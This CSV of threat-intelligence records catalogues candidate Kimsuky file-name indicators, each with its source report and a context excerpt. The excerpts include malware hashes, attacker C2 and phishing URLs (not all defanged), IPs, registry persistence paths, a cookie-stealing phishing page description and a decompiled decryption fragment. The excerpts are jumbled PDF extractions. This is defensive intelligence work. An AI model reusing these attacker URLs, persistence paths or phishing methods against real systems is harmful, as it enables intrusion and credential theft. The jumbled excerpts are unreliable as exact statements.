schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:9905867610ebf7d1d7d0735ffa5e867c7fd55ec83a72ae2d6d112e2b9a90b7c8,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 57}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ After BASE64 decoding: regularmanager296@gmail.com dji)(#(partially deleted) 57 The Kimsuky organization confirmed that it had accessed not only Daum mail accounts but also Gmail accounts. When using TeamViewer for the first time, an email authentication process was performed, and Kimsuky's organization determined that Google Mail was used to receive authentication information. ÿ Existence of the North Korean expression “face-to-face department” The North Korean expression “face-to-face depart",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:f729e32874b7a5c837323ef10d015f43893c0897573335fa024274403af2f441,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 63}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 27) **** Case of phishing for the purpose of hacking a specific person working at a university. North Korean expressions were also present in the index.php (proxy page) of Naver phishing in “(Table 26) C2 structural analysis and hacking target information” . In Korea, according to the Korean language norms of the National Institute of the Korean Language, convert is written as “convert,” but in North Korea, bait file I decided. URL Second, in Table 27 below, the bait file (recommendation.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:caacdbfa20d587e5aefef509b3ce0ba8f885059ca9079157f26778ca8d1c9de2,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 64}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://kornorms.korean.go.kr/example/exampleList.do?regltn_code=0003 No ÿ May 2023, 183.111.100.193 (KR) In May 2023, AhnLab disclosed analysis information titled “Phishing attack targeting North Korean workers by Kimsuky Group” on the ASEC blog, and in this case, the target of hacking was *****. As a result of searching for a specific person working at a research institute, there was a history of appearing on broadcasts and giving interviews related to North Korea. Although this person is diff",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:b362f81a42e8a8e0955e7c1780274147a519920b9b5d1cdd83ffed7e9ec44435,file-name,index.php,index.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:17ebaf270d6867aa4a465a550d899964de027781f5d48b81fe44b930ae511fea,file-name,index.php,index.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:c516db9e3fbbc97d5dcbcf548ffe0fa02cca5a91bb91ec01572f2924b0f69b25,file-name,(index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--24447f44f83f408c,kimsuky/2024-05-28-kimsuky-webshell.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"페이지 5 / 9 하우리 악성코드 상세 분석 보고서 (5) 피싱 서버는 네이버와 HTTP 통신을 기록을 “/네이버 ID/네이버 ID.txt” 로그 파일에 기록하고 있다. [그림 5] 네이버 통신 로그 (6) 만약 올바른 계정 정보를 입력할 경우 피싱 서버에서 네이버에 로그인 후 네이버 계정 접속에 필요한 Cookie 들을 “/네이버 ID/네이버 ID_Cookie.log.txt” 파일에 저장한다. ※ 수집되는 Cookie : NID_SES, NID_AUT, NID_JKL, NID_SAUTO [그림 6] Cookie 를 수집하는 피싱 페이지 코드(index.php)",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:8c2c4959bc595eb402cbdc3e00dfa2075363efa321deefc7f4874a4954008f37,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 int i4 = i - 16; byte[] bArr2 = new byte[i4]; byte[] bArr3 = new byte[16]; System.arraycopy(bArr, 0, bArr3, 0, 16); int i5 = 0; byte b2 = 0; while (i2 < i4) { if (i5 >= 16) { i5 -= 16; } int i6 = i2 + 16; byte b3 = bArr[i6]; bArr2[i2] = (byte) (b2 ^ (bArr[i6] ^ bArr3[i5])); i2++; i5++; b2 = b3; } return new String(bArr2, StandardCharsets.UTF_8); } catch (Exception unused) { return """"; } } 对相关参数进行解密，得到伪装成 KISA（韩国互联网安全局）应用的相关信息。  KISA_FOREGROUND_SERVI",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:9788fdd66c867a4815f4d06fdd6153f1a728f39300565cd3d8f434c58d2037cd,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[18]. 调用函数 c.c.a.c 之后在函数 c.c.a.e.c 中会拼接请求 URL 用于获取命令，拼接 URL 结果为 http://app.at -me.ml/index.php?m=b&p1=""android_id"" &p2=c，并创建 cmd.dat 文件用于存储命令，该 域名同样被解析到服务器 104.128.239.70。 图[19]. 拼接 URL 获取命令 最后调用函数 c.c.a.g.a ，用于执行服务端返回的命令（1，2，3，4，5，6，7，8）。",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:35fe53e52418f44ec22ba91c5b3ea3e16a676b4fb44cf0d30b1a8aa0fec74196,observation--sha256:d9c41aee298b896d2098b7736b5dc6923d33f054de7f6c33447278b9110072cf,file-name,index1.php,index1.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:35fe53e52418f44ec22ba91c5b3ea3e16a676b4fb44cf0d30b1a8aa0fec74196,observation--sha256:daf029e1034e94840c708898f55eef4426e6fad6ac4f5bcb519bdc3daaa093d0,file-name,index1.php,index1.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d3ef5260f7f734d8a8b5cceeadaf1b1c87e8089255aa1e329db37c8b23ff567c,observation--sha256:a225f05b17dd4e6c91f3fed307994b8ade90a75d28b5a539e0df15ff364906be,file-name,index_.php,index_.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d3ef5260f7f734d8a8b5cceeadaf1b1c87e8089255aa1e329db37c8b23ff567c,observation--sha256:5ec64f27b7931dbf995f6ec5d0f7733ab73012e1394ac6b9fff11469d79b6cfd,file-name,index_.php,index_.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7e914c334d1c6c0695f0281f2cdae67548a9a8c8725704374527e74e9bf63d31,observation--sha256:7b0a8a5c579ab7d942259998bcf64cec99f8d206c88aec69c033afba4f7f2630,file-name,ins_secure.chmMessage.chm,ins_secure.chmMessage.chm,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:9492305fe0868920d4fc4c9518a051d9bc25ecfd4e777136367cc630fdfbaa31,observation--sha256:045130c90571c0c90514bb5f188a2e2cd7519d8a67148490f99ec38a0b61b8cb,file-name,insert_link.php,insert_link.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ www.bluemotion.co.kr/cheditor4/insert_link.php ÿ www.scabm.co.kr/gnuboard4/bbs/view_coma.php ÿ kakaoreug.info/tygygvftsfx8g68Gu8x7s78gsvseidj6.php ÿ bstill.kr/gnuboard4/bbs/view_coma.php 12 ÿ afgvillage.eu/tygygvftsfx8g68Gu8x7s78gsx6.php ÿ listmember.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ kakaocore.eu/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ www.mykoces.com/gnuboard4/bbs/view_coma.php ÿ e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9492305fe0868920d4fc4c9518a051d9bc25ecfd4e777136367cc630fdfbaa31,observation--sha256:cde22c281bc92345713a305477e882f625ae7abb5a10f7fa9da5fd5bc82cff79,file-name,insert_link.php,insert_link.php,candidate,2023-03-22T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 54}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,27.255.80.170(KR) 6 GuestUser 2023-03-22 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsxueidj6.php 09:09:55 Operation Covert Stalker Report 2023-04-11 54 hxxp://www.bluemotion.co.kr/cheditor 4/ insert_link.php 27.255.75.137(KR) hxxps://usesignal.info/tygygvftsfx8g68 Gu8x7s78gsx6.php 10 16:44:22 74.119.239.234(US) 27.255.80.170(KR) 5 222.102.7.13(KR) 12 74.119.239.234(US) GuestUser hxxps://extparts.info/tygygvftsfx8g68G u8x7s78gsx6.php 16:43:53 2023-04-01 9 09:12:21 27.255.75.137(KR) 2023-04-,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9492305fe0868920d4fc4c9518a051d9bc25ecfd4e777136367cc630fdfbaa31,observation--sha256:fa0a0f9dfa9dfffad1d9bbde425be2055ef10581dabcf32c0927a5f71606825e,file-name,insert_link.php,insert_link.php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9492305fe0868920d4fc4c9518a051d9bc25ecfd4e777136367cc630fdfbaa31,observation--sha256:96f9edb8d9df9f966b3cf9086ce3434c6a69f8650b3bf0e95ec642c2ec005b65,file-name,insert_link.php,insert_link.php,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9782267751a09fd7820003b9c1af2a7ebc75cf389de5bc95de65df87049c1734,observation--sha256:b7c626bc0ffa41edbafdf2d6eff0dd0917358a4900c7d7b6f730be778b3351de,file-name,ivanti-new-exp-20241220.zip,ivanti-new-exp-20241220.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 578}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,(The file is also included in ivanti-new-exp-20241220.zip),Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:82b609e95073c9bfd8886c58ff91bd07898f03b490a722f7e118e380e817f25f,observation--sha256:6b308aff6921440fb13b05c88ad57e13d492b5a8e81c95f8d30f4a4e5aed7e38,file-name,ja.js,ja.js,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
